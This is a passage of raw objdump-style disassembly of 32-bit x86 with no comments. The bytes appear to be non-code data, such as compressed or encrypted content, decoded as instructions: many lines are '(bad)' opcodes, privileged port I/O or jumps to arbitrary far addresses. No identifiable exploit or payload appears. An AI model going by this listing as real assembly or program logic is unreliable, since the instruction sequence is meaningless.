  42ee68:	add    ebp,edx
  42ee6a:	mov    dh,0x54
  42ee6c:	mov    ah,cl
  42ee6e:	enter  0x15aa,0x1b
  42ee72:	lods   eax,DWORD PTR ds:[esi]
  42ee73:	(bad)  
  42ee74:	cmp    eax,0x3272906
  42ee79:	loopne 0x42ee67
  42ee7b:	and    BYTE PTR [eax+0x57],0xcf
  42ee7f:	mov    dl,0x5a
  42ee81:	into   
  42ee82:	inc    edi
  42ee83:	test   DWORD PTR ds:0xd20f1d00,edx
  42ee89:	fcmovb st,st(6)
  42ee8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ee8c:	add    DWORD PTR [ebx],edi
  42ee8e:	or     dl,bl
  42ee90:	lea    esi,[edx-0x2ab494fd]
  42ee96:	mov    ebx,0x4d4746c5
  42ee9b:	mov    BYTE PTR [ecx+ecx*2+0x351e3569],0xe8
  42eea3:	arpl   WORD PTR [ecx+0x63],bp
  42eea6:	fsubr  QWORD PTR [edi+0x3f]
  42eea9:	outs   dx,BYTE PTR ds:[esi]
  42eeaa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42eeab:	xchg   ecx,esp
  42eead:	sub    bl,dl
  42eeaf:	outs   dx,BYTE PTR ds:[esi]
  42eeb0:	lea    edx,[edi-0x14]
  42eeb3:	adc    DWORD PTR [eax-0x77],esp
  42eeb6:	and    eax,0xec041da2
  42eebb:	mov    ecx,0x14edbeae
  42eec0:	mov    ebp,0xbb154d0
  42eec5:	fst    DWORD PTR [ebp+0x5b]
  42eec8:	or     eax,0x283b444b
  42eecd:	mov    edx,0x463b3267
  42eed2:	xchg   esi,eax
  42eed3:	adc    esp,DWORD PTR [eax-0x24f2f492]
  42eed9:	push   ecx
  42eeda:	(bad)  
  42eedc:	cmp    ecx,DWORD PTR [edx+0x5c]
  42eedf:	ficom  DWORD PTR [ebp-0x40]
  42eee2:	mov    es,esp
  42eee4:	jae    0x42eeb2
  42eee6:	mov    edx,0x6d3e9cb7
  42eeeb:	fwait
  42eeec:	xor    BYTE PTR [ebx+eiz*4-0x5211944a],0x22
  42eef4:	in     eax,0xd0
  42eef6:	mov    edx,0xcdb9d0b1
  42eefb:	or     al,0xde
  42eefd:	cmp    dl,BYTE PTR ds:0xb6e828c4
  42ef03:	mov    al,0x8e
  42ef05:	mov    al,0xa0
  42ef07:	loop   0x42eed1
  42ef09:	das    
  42ef0a:	jle    0x42ef80
  42ef0c:	popa   
  42ef0d:	popa   
  42ef0e:	imul   ecx,DWORD PTR [edi+0x347c0e87],0x53
  42ef15:	fs pop ebx
  42ef17:	cmc    
  42ef18:	mov    eax,DWORD PTR [edx]
  42ef1a:	jbe    0x42ef2c
  42ef1c:	into   
  42ef1d:	jnp    0x42ef82
  42ef1f:	adc    ebx,esp
  42ef21:	pop    edx
  42ef22:	push   ebp
  42ef23:	in     eax,dx
  42ef24:	cdq    
  42ef25:	aam    0xa
  42ef27:	jge    0x42ef46
  42ef29:	dec    esi
  42ef2a:	xor    BYTE PTR [esi+0x3678154d],0xf1
  42ef31:	mov    edi,0xc040d685
  42ef36:	scas   al,BYTE PTR es:[edi]
  42ef37:	mov    ecx,0xcee2bd93
  42ef3c:	cmp    BYTE PTR [edx],ch
  42ef3e:	mov    dh,0x1b
  42ef40:	in     eax,dx
  42ef41:	rcl    BYTE PTR [edx-0x6935402],cl
  42ef47:	and    edx,DWORD PTR [edi-0x64fdceec]
  42ef4d:	or     al,BYTE PTR [esi]
  42ef4f:	test   eax,0x41a36090
  42ef54:	mov    ch,0x35
  42ef56:	rcl    DWORD PTR [edx],0x6e
  42ef59:	jmp    0x42eeec
  42ef5b:	in     eax,dx
  42ef5c:	call   0x84a45d17
  42ef61:	dec    edi
  42ef62:	inc    ebp
  42ef63:	add    bl,dh
  42ef65:	mov    al,0x76
  42ef67:	enter  0x1d3e,0x15
  42ef6b:	mov    al,0xb
  42ef6d:	in     eax,dx
  42ef6e:	retf   0x8061
  42ef71:	inc    ebp
  42ef72:	mov    cl,0x81
  42ef74:	xchg   esi,eax
  42ef75:	outs   dx,BYTE PTR ds:[esi]
  42ef76:	inc    ecx
  42ef77:	pop    esp
  42ef78:	sti    
  42ef79:	mov    ecx,0x41b0efa
  42ef7e:	mov    al,ds:0xc415756e
  42ef83:	xlat   BYTE PTR ds:[ebx]
  42ef84:	jo     0x42eff4
  42ef86:	pop    eax
  42ef87:	inc    ebp
  42ef88:	and    ebx,DWORD PTR [eax+0x68]
  42ef8b:	push   ds
  42ef8c:	test   DWORD PTR [edx],0x146dc20
  42ef92:	push   0xf8e8441b
  42ef97:	mov    cl,0xf3
  42ef99:	lods   eax,DWORD PTR ds:[esi]
  42ef9a:	in     eax,dx
  42ef9b:	test   al,0xe0
  42ef9d:	(bad)  
  42ef9e:	shr    al,0xe
  42efa1:	ret    0xe6f8
  42efa4:	xchg   ebp,eax
  42efa5:	outs   dx,BYTE PTR ds:[esi]
  42efa6:	xor    al,0xaa
  42efa8:	jmp    0x8ec876e1
  42efad:	clc    
  42efae:	mov    ah,0xa3
  42efb0:	push   0x4a163ebb
  42efb5:	pop    edi
  42efb6:	cmp    al,0xbe
  42efb8:	jne    0x42ef4a
  42efba:	or     edx,ebp
  42efbc:	(bad)  
  42efbd:	adc    BYTE PTR [eax+0x3bce65e6],ah
  42efc3:	push   0xae6db6c0
  42efc8:	sar    BYTE PTR [edi+0x6968969e],cl
  42efce:	inc    esp
  42efcf:	sbb    BYTE PTR [ebx],bh
  42efd1:	mov    al,ds:0xefbab6e0
  42efd6:	out    0xb,al
  42efd8:	fwait
  42efd9:	jne    0x42efc3
  42efdb:	sbb    eax,0x4117516c
  42efe0:	outs   dx,DWORD PTR ds:[esi]
  42efe1:	and    cl,BYTE PTR [ecx+0x3608ed38]
  42efe7:	push   ecx
  42efe8:	and    esi,DWORD PTR [esi-0x4c]
  42efeb:	or     bh,BYTE PTR [eax]
  42efed:	inc    edx
  42efee:	ins    BYTE PTR es:[edi],dx
  42efef:	les    ebp,FWORD PTR [ecx+0x57]
  42eff2:	add    al,0xd3
  42eff4:	(bad)  
  42eff6:	inc    edi
  42eff7:	or     BYTE PTR [eax+0x53],al
  42effa:	inc    eax
  42effb:	sbb    eax,0xefd740d7
  42f000:	sbb    eax,0xc00a9751
  42f005:	jno    0x42efc1
  42f007:	dec    eax
  42f008:	out    dx,eax
  42f009:	jmp    0xb6d5:0xb6a1addb
  42f010:	nop
  42f011:	lods   al,BYTE PTR ds:[esi]
  42f012:	sahf   
  42f013:	cwde   
  42f014:	xchg   esp,eax
  42f015:	mov    bh,0x8f
  42f017:	cmp    eax,0x1475412
  42f01c:	cmp    esp,DWORD PTR [edx]
  42f01e:	xchg   edx,eax
  42f01f:	xor    eax,0x25db5b45
  42f024:	push   eax
  42f025:	add    esp,eax
  42f027:	inc    ebp
  42f028:	cwde   
  42f029:	mov    edx,0x32a956e0
  42f02e:	xor    bl,bl
  42f030:	popf   
  42f031:	arpl   WORD PTR [esi+0x56],bp
  42f034:	add    BYTE PTR [edx],bl
  42f036:	add    cl,BYTE PTR [edx+0x2cdd1259]
  42f03c:	ins    BYTE PTR es:[edi],dx
  42f03d:	mov    al,0xc5
  42f03f:	inc    edi
  42f040:	fistp  DWORD PTR [edx+0x29]
  42f043:	in     al,dx
  42f044:	int    0x2
  42f046:	mov    ds:0xca2dbb5b,al
  42f04b:	jp     0x42f052
  42f04d:	pop    ebx
  42f04e:	mov    WORD PTR [edx],es
  42f050:	pop    esp
  42f051:	xor    BYTE PTR [edi-0x7e],bl
  42f054:	or     eax,0x6cb3ed44
  42f059:	xor    ecx,DWORD PTR [ebx-0x6ad2066b]
  42f05f:	mov    ds:0x91002709,al
  42f064:	ds push esp
  42f066:	lds    eax,FWORD PTR [esi]
  42f068:	and    BYTE PTR [esi],ch
  42f06a:	add    al,BYTE PTR [ecx]
  42f06c:	sahf   
  42f06d:	adc    BYTE PTR [edx-0x36],ch
  42f070:	add    DWORD PTR [ebx+0x41],ebx
  42f073:	pop    es
  42f074:	imul   edi,DWORD PTR [ecx+0x2eb61214],0xf5a71d80
  42f07e:	fidiv  WORD PTR [ebx-0x1d]
  42f081:	jp     0x42f03e
  42f083:	mov    gs,WORD PTR [edx+0x786a17e5]
  42f089:	mov    al,BYTE PTR [eax]
  42f08b:	loopne 0x42f09e
  42f08d:	mov    WORD PTR [esi-0x1e],?
  42f090:	inc    esi
  42f091:	add    edx,esp
  42f093:	sbb    ah,ah
  42f095:	mov    esi,0xaa1bdb56
  42f09a:	ins    DWORD PTR es:[edi],dx
  42f09b:	xor    DWORD PTR [esi-0x13f76cf5],0x56
  42f0a2:	(bad)  
  42f0a3:	fs jge 0x42f111
  42f0a6:	sbb    BYTE PTR [edx],0xb6
  42f0a9:	mov    ah,0x41
  42f0ab:	xor    al,0x58
  42f0ad:	int    0x86
  42f0af:	dec    esp
  42f0b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f0b1:	ins    DWORD PTR es:[edi],dx
  42f0b2:	xor    eax,0xe4e17440
  42f0b7:	jl     0x42f057
  42f0b9:	icebp  
  42f0ba:	jl     0x42f0dd
  42f0bc:	sbb    BYTE PTR [ebx-0x45],0xa1
  42f0c0:	or     eax,0x34e3cba5
  42f0c5:	iret   
  42f0c6:	or     eax,0xa805aa83
  42f0cb:	xor    cl,bl
  42f0cd:	ficom  WORD PTR [eax-0x4a]
  42f0d0:	fidiv  DWORD PTR ss:[esi-0x7a85e5d5]
  42f0d7:	xchg   BYTE PTR [esi+ebx*8],ah
  42f0da:	jbe    0x42f0c1
  42f0dc:	jecxz  0x42f0a5
  42f0de:	jbe    0x42f0bb
  42f0e0:	sub    DWORD PTR [edx-0x5f],esp
  42f0e3:	sub    BYTE PTR [ebx-0x57d2ff26],dl
  42f0e9:	aaa    
  42f0ea:	out    0x15,eax
  42f0ec:	mov    ah,0x65
  42f0ee:	popa   
  42f0ef:	es pop ebx
  42f0f1:	jnp    0x42f0de
  42f0f3:	or     BYTE PTR [ebp+0x4d],ch
  42f0f6:	adc    DWORD PTR [eax+0x58699e68],esi
  42f0fc:	(bad)  
  42f0fd:	xchg   ecx,eax
  42f0fe:	fsub   DWORD PTR [edx+0x6b7906b6]
  42f104:	mov    ecx,0xd5477912
  42f109:	scas   al,BYTE PTR es:[edi]
  42f10a:	sub    BYTE PTR [esi+edi*1],bh
  42f10d:	mov    ds:0x26b7048,eax
  42f112:	push   0x56
  42f114:	add    bh,0x5d
  42f117:	xor    ah,bh
  42f119:	dec    ebx
  42f11a:	lods   eax,DWORD PTR ds:[esi]
  42f11b:	stos   BYTE PTR es:[edi],al
  42f11c:	push   eax
  42f11d:	pop    ebp
  42f11e:	test   esi,ebx
  42f120:	std    
  42f121:	push   eax
  42f122:	or     ecx,DWORD PTR [ebx]
  42f124:	xchg   edi,eax
  42f125:	mov    bh,0xa0
  42f127:	sahf   
  42f128:	mov    ch,0x0
  42f12a:	and    esp,DWORD PTR ss:[edx+0x28]
  42f12e:	gs (bad) 
  42f130:	outs   dx,BYTE PTR ds:[esi]
  42f131:	jge    0x42f134
  42f133:	or     eax,0xead2ce11
  42f138:	or     al,0xc1
  42f13a:	lods   eax,DWORD PTR ds:[esi]
  42f13b:	or     DWORD PTR [eax+0x67b216f8],edi
  42f141:	sbb    BYTE PTR [ebp+eax*8+0x2e],bl
  42f145:	and    al,bl
  42f147:	adc    al,0xb1
  42f149:	es jne 0x42f0f7
  42f14c:	pusha  
  42f14d:	xor    ebp,DWORD PTR [eax+0x1b]
  42f150:	mov    bh,0x8e
  42f152:	nop
  42f153:	lock out dx,eax
  42f155:	mov    ch,0x9f
  42f157:	(bad)  
  42f158:	jecxz  0x42f155
  42f15a:	ficomp DWORD PTR [edx+0x6cf8a360]
  42f160:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f161:	scas   al,BYTE PTR es:[edi]
  42f162:	jecxz  0x42f110
  42f164:	inc    ebx
  42f165:	adc    esp,ebx
  42f167:	pop    edx
  42f168:	retf   
  42f169:	test   BYTE PTR [esp+eax*1],bl
  42f16c:	xor    eax,0xb6801be3
  42f171:	ins    DWORD PTR es:[edi],dx
  42f172:	inc    eax
  42f173:	icebp  
  42f174:	add    dl,BYTE PTR [ecx-0x182f8a4]
  42f17a:	sub    ecx,DWORD PTR [eax]
  42f17c:	push   0x43
  42f17e:	push   ebp
  42f17f:	dec    ebp
  42f180:	push   es
  42f181:	jo     0x42f1f1
  42f183:	or     eax,0xd2f4ec55
  42f188:	jae    0x42f1a2
  42f18a:	stos   DWORD PTR es:[edi],eax
  42f18b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f18c:	fsubr  QWORD PTR [ebx-0x13]
  42f18f:	mov    BYTE PTR [edx-0x4f789eb],bh
  42f195:	dec    ecx
  42f196:	cmp    DWORD PTR [ebx+0x768dd231],0xffffffa3
  42f19d:	inc    ecx
  42f19e:	cmp    DWORD PTR [esi+0x5b],esi
  42f1a1:	enter  0x193,0x14
  42f1a5:	adc    DWORD PTR [esi],esi
  42f1a7:	push   ebp
  42f1a8:	shr    BYTE PTR [ebp-0x3e4b6403],0xa4
  42f1af:	mov    edx,0xaaeb6aea
  42f1b4:	out    0xf,al
  42f1b6:	mov    esp,0x1ae4a26
  42f1bb:	mov    al,0x5
  42f1bd:	push   ebp
  42f1be:	imul   ebx,DWORD PTR [ebx+edi*1],0xffffff96
  42f1c2:	push   0xbacd35c9
  42f1c7:	jge    0x42f1c7
  42f1c9:	cmp    eax,0x8851389f
  42f1ce:	or     BYTE PTR es:[ebx-0x5b],bh
  42f1d2:	shl    BYTE PTR [esp+eax*2-0x731e4f45],0x7c
  42f1da:	push   ebp
  42f1db:	fwait
  42f1dc:	adc    ecx,DWORD PTR gs:[ecx]
  42f1df:	push   0x5fb0ba88
  42f1e4:	arpl   ax,bp
  42f1e6:	int3   
  42f1e7:	cmp    DWORD PTR [edi],0xa7b71567
  42f1ed:	fcomp  DWORD PTR [esi]
  42f1ef:	xchg   ebp,eax
  42f1f0:	sub    BYTE PTR [eax+0x6defa708],dh
  42f1f6:	or     al,BYTE PTR [eax+0x62c2aa1d]
  42f1fc:	int    0xed
  42f1fe:	repnz sbb ebp,DWORD PTR [eax+esi*1+0x11]
  42f203:	mov    dl,0x64
  42f205:	dec    eax
  42f206:	cwde   
  42f207:	add    bh,BYTE PTR [ecx+edx*1+0x3d2896dc]
  42f20e:	mov    DWORD PTR [ebx],ecx
  42f210:	cdq    
  42f211:	pushf  
  42f212:	fcomp  QWORD PTR [edx]
  42f214:	pop    ds
  42f215:	fmul   DWORD PTR [edi+0x6d]
  42f218:	call   0x7c0943e6
  42f21d:	mov    DWORD PTR [esp+ebp*1+0x454daa2e],esp
  42f224:	jge    0x42f1a9
  42f226:	pop    esi
  42f227:	and    ebp,ebp
  42f229:	mov    dh,0xf1
  42f22b:	shl    DWORD PTR [ebp+0x5d],1
  42f22e:	sub    BYTE PTR [esi+eax*8+0x7],bh
  42f232:	loopne 0x42f29a
  42f234:	inc    BYTE PTR [edx]
  42f236:	adc    eax,0x8c070db7
  42f23b:	cmp    al,0xd8
  42f23d:	mov    WORD PTR [ebp+0x6a09b676],ss
  42f243:	push   edi
  42f244:	fcom   DWORD PTR [ebx-0x2cbda9b5]
  42f24a:	imul   esp,ebp,0xfffffff2
  42f24d:	rol    BYTE PTR [ebp-0x19f7ccd8],cl
  42f253:	or     al,0x0
  42f255:	rcr    BYTE PTR [esi+edx*2+0x115b0076],1
  42f25c:	xchg   BYTE PTR [esi-0x71],ah
  42f25f:	int3   
  42f260:	rcl    dh,1
  42f262:	push   eax
  42f263:	mov    ebx,0xaa8a6e22
  42f268:	mov    ch,0x31
  42f26a:	push   ebx
  42f26b:	sub    ebp,ebp
  42f26d:	sub    al,ch
  42f26f:	lods   eax,DWORD PTR ds:[esi]
  42f270:	fisttp WORD PTR [eax+0x11088826]
  42f276:	mov    bh,0xd2
  42f278:	mov    dh,0x75
  42f27a:	jmp    0x42f2f3
  42f27c:	sub    esp,DWORD PTR ds:0xd1d1d96e
  42f282:	jo     0x42f2ad
  42f284:	fist   DWORD PTR [esi+0x47]
  42f287:	add    BYTE PTR [ebp+0x2f644c2b],dh
  42f28d:	mov    ch,BYTE PTR cs:[ebp+0x17]
  42f291:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f292:	stos   DWORD PTR es:[edi],eax
  42f293:	pop    esp
  42f294:	lock jecxz 0x42f237
  42f297:	push   ebx
  42f298:	xchg   edx,eax
  42f299:	lea    ebp,[ebp-0x479ff453]
  42f29f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f2a0:	icebp  
  42f2a1:	xor    DWORD PTR [esi+0x1710515a],ebp
  42f2a7:	ficom  DWORD PTR [edi+0x18fd2940]
  42f2ad:	retf   0x835b
  42f2b0:	mov    dh,0xd1
  42f2b2:	push   esi
  42f2b3:	jnp    0x42f2f4
  42f2b5:	dec    esi
  42f2b6:	and    BYTE PTR [ebx+0x11],cl
  42f2b9:	sub    bh,BYTE PTR [edx-0x6d9069f6]
  42f2bf:	cs add dl,ah
  42f2c2:	in     al,0x28
  42f2c4:	mov    esi,0x6aab6398
  42f2c9:	fild   DWORD PTR ds:0xdf5b17c6
  42f2cf:	scas   eax,DWORD PTR es:[edi]
  42f2d0:	adc    eax,0x46c2c2c6
  42f2d5:	inc    ebp
  42f2d6:	(bad)  
  42f2d7:	fs xor al,0xe8
  42f2da:	mov    al,ds:0xaec4090
  42f2df:	jmp    0x2ddb:0xd90e7de7
  42f2e6:	ins    BYTE PTR es:[edi],dx
  42f2e7:	ins    DWORD PTR es:[edi],dx
  42f2e8:	adc    esi,DWORD PTR [ecx]
  42f2ea:	jge    0x42f2e7
  42f2ec:	das    
  42f2ed:	mov    edi,0x6db564bf
  42f2f2:	sbb    ecx,DWORD PTR [eax-0x7df33748]
  42f2f8:	in     al,dx
  42f2f9:	lea    esp,[ebp+0x46e8657a]
  42f2ff:	adc    esi,DWORD PTR [ecx+esi*2+0x1e10062b]
  42f306:	push   ds
  42f307:	pop    edx
  42f308:	push   esp
  42f309:	mov    bh,0x85
  42f30b:	or     edi,DWORD PTR cs:[ebx]
  42f30e:	mov    edi,DWORD PTR [esi+0x1b208dc8]
  42f314:	in     eax,dx
  42f315:	(bad)  
  42f316:	ss jecxz 0x42f2cf
  42f319:	dec    esp
  42f31a:	cwde   
  42f31b:	into   
  42f31c:	and    al,0xfe
  42f31e:	das    
  42f31f:	sbb    ah,dh
  42f321:	ins    DWORD PTR es:[edi],dx
  42f322:	add    dl,bl
  42f324:	outs   dx,BYTE PTR ds:[esi]
  42f325:	or     esp,DWORD PTR [ebp+0x4a80bff0]
  42f32b:	or     ecx,DWORD PTR [ebx]
  42f32d:	push   esp
  42f32e:	jo     0x42f391
  42f330:	mov    ds:0xc4ff9629,eax
  42f335:	sbb    ecx,DWORD PTR [eax-0x49]
  42f338:	sbb    dh,BYTE PTR [ebp+esi*1+0x450b876e]
  42f33f:	push   ss
  42f340:	scas   eax,DWORD PTR es:[edi]
  42f341:	dec    esp
  42f342:	int    0xa
  42f344:	mov    dh,0x76
  42f346:	imul   edi,eax,0xffffffb6
  42f349:	push   edx
  42f34a:	nop
  42f34b:	and    BYTE PTR [eax+0x2d55b662],dh
  42f351:	xor    al,0xe7
  42f353:	and    dl,BYTE PTR [ebx+0x17]
  42f356:	jmp    0x614a9d2
  42f35b:	rcl    BYTE PTR [eax],1
  42f35d:	and    DWORD PTR [ebx],0x66
  42f360:	addr16 mov bl,0x44
  42f363:	sub    al,0x54
  42f365:	jmp    0xc1de9b2e
  42f36a:	jmp    0x5d89f926
  42f36f:	out    0x2e,al
  42f371:	xor    edi,eax
  42f373:	ds out dx,eax
  42f375:	(bad)  
  42f376:	xor    bl,ch
  42f378:	stos   BYTE PTR es:[edi],al
  42f379:	ficom  DWORD PTR [ebx+eiz*1+0x71]
  42f37d:	(bad)  
  42f37e:	test   eax,0x823aef1c
  42f383:	test   DWORD PTR [edx-0x1b],ebp
  42f386:	es pop esp
  42f388:	dec    edi
  42f389:	daa    
  42f38a:	or     ecx,DWORD PTR [ebp+0x10]
  42f38d:	pop    ss
  42f38e:	mov    edi,DWORD PTR [ebp-0x56bf923d]
  42f394:	adc    al,0x10
  42f396:	mov    ebx,0xf9506e88
  42f39b:	xor    BYTE PTR [edx+0x72],dh
  42f39e:	sahf   
  42f39f:	test   DWORD PTR [esi],ecx
  42f3a1:	test   al,0x5d
  42f3a3:	fmul   DWORD PTR [edi]
  42f3a5:	pop    ebx
  42f3a6:	inc    ebp
  42f3a7:	mov    esi,0xd6db5b31
  42f3ac:	and    BYTE PTR [ecx+0x62d1fe55],0xdc
  42f3b3:	pop    ebx
  42f3b4:	popf   
  42f3b5:	loopne 0x42f36d
  42f3b7:	sub    eax,0x4fbaeb4
  42f3bc:	pop    ebp
  42f3bd:	push   cs
  42f3be:	mov    bl,0x8
  42f3c0:	push   edx
  42f3c1:	inc    edx
  42f3c2:	fadd   DWORD PTR [ecx+eax*8+0xe]
  42f3c6:	jge    0x42f3b5
  42f3c8:	retf   0xaf64
  42f3cb:	push   ebx
  42f3cc:	sahf   
  42f3cd:	sub    bh,BYTE PTR [edx+0x7200d54]
  42f3d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f3d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f3d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f3d6:	sbb    eax,0x872abb01
  42f3db:	or     dh,BYTE PTR [ebp-0x3e]
  42f3de:	mov    ?,WORD PTR [ebx+ebp*4-0x75f4bd2]
  42f3e5:	mov    edx,DWORD PTR [ecx-0x28]
  42f3e8:	pop    ebx
  42f3e9:	fs call 0x3a53:0x50d85001
  42f3f1:	das    
  42f3f2:	ror    BYTE PTR ds:0x87a16db6,1
  42f3f8:	call   0x7130:0x471450d5
  42f3ff:	adc    al,0x19
  42f401:	test   al,0xa6
  42f403:	adc    bh,BYTE PTR [eax]
  42f405:	test   eax,0x1b0016c
  42f40a:	mov    eax,0xc68435bc
  42f40f:	out    0xe3,eax
  42f411:	inc    esp
  42f412:	sub    eax,0xeca20d04
  42f417:	mov    eax,ds:0xd6ea00e3
  42f41c:	ficomp DWORD PTR [edx-0x469eeafe]
  42f422:	jl     0x42f447
  42f424:	mov    dh,0x75
  42f426:	adc    al,0x6c
  42f428:	add    ch,dl
  42f42a:	iret   
  42f42b:	mov    ebp,0x5edb998
  42f430:	in     al,dx
  42f431:	sub    dl,ah
  42f433:	shl    BYTE PTR [edx+0x74],cl
  42f436:	pop    esi
  42f437:	sbb    bl,al
  42f439:	clc    
  42f43a:	or     eax,0x2c01368a
  42f43f:	jl     0x42f465
  42f441:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f442:	xchg   edx,ebp
  42f444:	rol    BYTE PTR [ebp-0xbe5948a],1
  42f44a:	clc    
  42f44b:	out    0xbf,al
  42f44d:	jno    0x42f474
  42f44f:	out    dx,al
  42f450:	pop    eax
  42f451:	cmp    DWORD PTR [edx-0x27aef2f],0xf9aeb50f
  42f45b:	add    al,0xd5
  42f45d:	lea    ebp,[ebp+0x39cec00]
  42f463:	xchg   edx,eax
  42f464:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f465:	test   al,0x2a
  42f467:	pop    edi
  42f468:	fsubr  DWORD PTR [edx]
  42f46a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f46b:	je     0x42f407
  42f46d:	cli    
  42f46e:	add    BYTE PTR [edi],al
  42f470:	mov    ah,0x3a
  42f472:	mov    bh,BYTE PTR [eax-0x27f26030]
  42f478:	(bad)  
  42f479:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f47a:	xchg   ebx,eax
  42f47b:	adc    esp,ebx
  42f47d:	ficom  DWORD PTR [esi]
  42f47f:	mov    ebx,0x340a3261
  42f484:	add    ebp,0xda08edaa
  42f48a:	cs push ss
  42f48c:	jns    0x42f4ca
  42f48e:	int3   
  42f48f:	jl     0x42f4ae
  42f491:	test   al,0xb
  42f493:	ins    DWORD PTR es:[edi],dx
  42f494:	and    edi,DWORD PTR [ebp-0x72]
  42f497:	and    BYTE PTR [edi+esi*8-0x3feb8b05],dl
  42f49e:	xchg   BYTE PTR [eax*4+0x68769c98],cl
  42f4a5:	inc    ebp
  42f4a6:	dec    ebx
  42f4a7:	ins    BYTE PTR es:[edi],dx
  42f4a8:	mov    ebp,0x766b13aa
  42f4ad:	mov    dh,BYTE PTR [eax-0x2b]
  42f4b0:	sbb    ch,0x6b
  42f4b3:	jbe    0x42f518
  42f4b5:	pop    ebx
  42f4b6:	jp     0x42f4b8
  42f4b8:	stc    
  42f4b9:	jecxz  0x42f536
  42f4bb:	ret    0x8a44
  42f4be:	js     0x42f522
  42f4c0:	add    eax,0x85b76f2d
  42f4c5:	sbb    DWORD PTR [edi],esi
  42f4c7:	mov    WORD PTR [esi-0x12],?
  42f4ca:	jmp    0xf540f506
  42f4cf:	fiadd  DWORD PTR [ecx]
  42f4d1:	add    eax,0xfca64d0d
  42f4d6:	shl    BYTE PTR [edx-0x2a],cl
  42f4d9:	inc    ebp
  42f4da:	shl    DWORD PTR [esi],0xfc
  42f4dd:	mov    al,0xb6
  42f4df:	stos   DWORD PTR es:[edi],eax
  42f4e0:	and    eax,0x4a17519b
  42f4e5:	les    esi,FWORD PTR [edx+0x2f5f7fda]
  42f4eb:	ins    DWORD PTR es:[edi],dx
  42f4ec:	sub    BYTE PTR [eax+0x53],0xeb
  42f4f0:	sub    al,0x24
  42f4f2:	or     cl,bl
  42f4f4:	sbb    DWORD PTR [esi+0x4],esi
  42f4f7:	jo     0x42f564
  42f4f9:	dec    esp
  42f4fa:	push   eax
  42f4fb:	cmp    esi,ebp
  42f4fd:	xor    al,0xaa
  42f4ff:	fcom   QWORD PTR [esi]
  42f501:	fimul  DWORD PTR [esi+0x45740ca8]
  42f507:	cmp    ebx,DWORD PTR [eax-0x3c]
  42f50a:	sbb    eax,0x17da5c40
  42f50f:	ins    BYTE PTR es:[edi],dx
  42f510:	xchg   BYTE PTR [ecx-0x14],ch
  42f513:	cld    
  42f514:	pusha  
  42f515:	or     ebp,DWORD PTR cs:[ebx+ebx*1+0x12]
  42f51a:	fild   WORD PTR [eax+0x6facc3ec]
  42f520:	pusha  
  42f521:	fmul   QWORD PTR [edx]
  42f523:	mov    ebx,0x22847aa8
  42f528:	out    dx,al
  42f529:	ficom  DWORD PTR [esi-0x51]
  42f52c:	aam    0x6e
  42f52e:	sbb    eax,0xce7fa714
  42f533:	lods   al,BYTE PTR ds:[esi]
  42f534:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f535:	and    BYTE PTR [ecx+0x6b],ah
  42f538:	or     BYTE PTR [eax-0x72e43e5f],bh
  42f53e:	sub    eax,0xa05be820
  42f543:	fcom   DWORD PTR [ecx+0x71]
  42f546:	pop    ss
  42f547:	add    eax,ecx
  42f549:	adc    BYTE PTR [esi+esi*1-0x12148efc],bh
  42f550:	jbe    0x42f53e
  42f552:	mov    ecx,0x3a55181e
  42f557:	fcom   QWORD PTR [esi]
  42f559:	call   0x4dde:0x430d7a28
  42f560:	inc    esi
  42f561:	cld    
  42f562:	cs ins DWORD PTR es:[edi],dx
  42f564:	pop    ebp
  42f565:	inc    ecx
  42f566:	stos   DWORD PTR es:[edi],eax
  42f567:	je     0x42f549
  42f569:	mov    eax,0xdefc6a4
  42f56e:	push   0x6d9aabb
  42f573:	test   al,0x1a
  42f575:	repz sbb BYTE PTR [ebx],0x1b
  42f579:	dec    ebx
  42f57a:	sahf   
  42f57b:	outs   dx,BYTE PTR ds:[esi]
  42f57c:	jmp    0x85d0:0x59e7f391
  42f583:	(bad)  
  42f584:	push   cs
  42f585:	xor    al,0xeb
  42f587:	mov    al,0x33
  42f589:	add    DWORD PTR [ecx-0x27a92459],esi
  42f58f:	add    DWORD PTR [ebx-0x22ab5233],edi
  42f595:	and    eax,edx
  42f597:	adc    BYTE PTR [eax],ah
  42f599:	push   0xa
  42f59b:	outs   dx,BYTE PTR ds:[esi]
  42f59c:	xor    cl,BYTE PTR [esi+0x6a245714]
  42f5a2:	fwait
  42f5a3:	sub    BYTE PTR [eax+0x39],bl
  42f5a6:	dec    ebx
  42f5a7:	xchg   edi,eax
  42f5a8:	pushf  
  42f5a9:	sahf   
  42f5aa:	pop    DWORD PTR [edi+esi*4+0x6d]
  42f5ae:	(bad)  [edx-0x37b82512]
  42f5b4:	retf   0xba7a
  42f5b7:	lea    esi,[edi+0xf576206]
  42f5bd:	xchg   esp,eax
  42f5be:	inc    edi
  42f5bf:	(bad)  
  42f5c0:	or     eax,0xa07c3408
  42f5c5:	test   DWORD PTR ds:0x334d9750,ecx
  42f5cb:	or     dl,BYTE PTR [esi-0x47]
  42f5ce:	sbb    DWORD PTR [edx+0x6c],ebp
  42f5d1:	outs   dx,BYTE PTR ds:[esi]
  42f5d2:	aam    0x95
  42f5d4:	pop    edx
  42f5d5:	imul   ecx,DWORD PTR [edx+0x6d],0xffffffbf
  42f5d9:	push   eax
  42f5da:	mov    al,0x14
  42f5dc:	pop    ebx
  42f5dd:	enter  0xdf35,0x67
  42f5e1:	mov    ds:0x460d8a83,eax
  42f5e6:	mov    ds:0x6ba5a02,eax
  42f5eb:	or     eax,0xcf696d88
  42f5f0:	xor    eax,0xe3180e8c
  42f5f5:	cmp    eax,DWORD PTR [eax+0x553b6c6e]
  42f5fb:	or     DWORD PTR [edi],ebp
  42f5fd:	int    0xfd
